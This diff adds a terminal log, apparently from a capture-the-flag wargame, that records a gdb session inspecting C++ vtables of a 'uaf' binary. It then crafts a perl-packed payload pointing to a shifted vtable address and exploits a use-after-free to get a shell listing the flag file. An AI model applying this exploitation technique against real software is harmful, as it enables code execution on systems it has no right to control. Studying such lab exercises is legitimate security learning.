@@ -1,0 +1,75 @@
+(gdb) x/3gx 0xefdc50
+0xefdc50:	0x0000000000401570	0x0000000000000019
+0xefdc60:	0x0000000000efdc38
+(gdb) x/s 0x0000000000efdc38
+0xefdc38:	"Jack"
+(gdb) b *0x0000000000400fad
+Breakpoint 3 at 0x400fad
+(gdb) c
+Continuing.
+1. use
+2. after
+3. free
+
+Breakpoint 3, 0x0000000000400fad in main ()
+(gdb) x/3gx 0xefdc50
+0xefdc50:	0x0000000000401570	0x0000000000000019
+0xefdc60:	0x0000000000efdc38
+(gdb) x/3gx 0xefdca0
+0xefdca0:	0x0000000000401550	0x0000000000000015
+0xefdcb0:	0x0000000000efdc88
+(gdb) x/3gx 0x0000000000401570
+0x401570 <_ZTV3Man+16>:	0x000000000040117a	0x00000000004012d2
+0x401580 <_ZTV5Human>:	0x0000000000000000
+(gdb) x/3gx 0x0000000000401550
+0x401550 <_ZTV5Woman+16>:	0x000000000040117a	0x0000000000401376
+0x401560 <_ZTV3Man>:	0x0000000000000000
+(gdb) q
+A debugging session is active.
+
+	Inferior 1 [process 48462] will be killed.
+
+Quit anyway? (y or n) y
+uaf@ubuntu:~$ perl -e 'print "pack(Q,0x0000000000401550 - 8) . "\x00"x16"' > /tmp/e
+Backslash found where operator expected at -e line 1, near ""pack(Q,0x0000000000401550 - 8) . "\"
+	(Missing operator before \?)
+String found where operator expected at -e line 1, near "x00"x16""
+syntax error at -e line 1, near ""pack(Q,0x0000000000401550 - 8) . "\"
+Execution of -e aborted due to compilation errors.
+uaf@ubuntu:~$ perl -e 'print pack(Q,0x0000000000401550 - 8) . "\x00"x16' > /tmp/e
+uaf@ubuntu:~$ ./uaf 24 /tmp/e
+1. use
+2. after
+3. free
+3
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+1
+Segmentation fault
+uaf@ubuntu:~$ ./uaf 24 /tmp/e
+1. use
+2. after
+3. free
+3
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+1
+$ ls
+flag  uaf  uaf.cpp
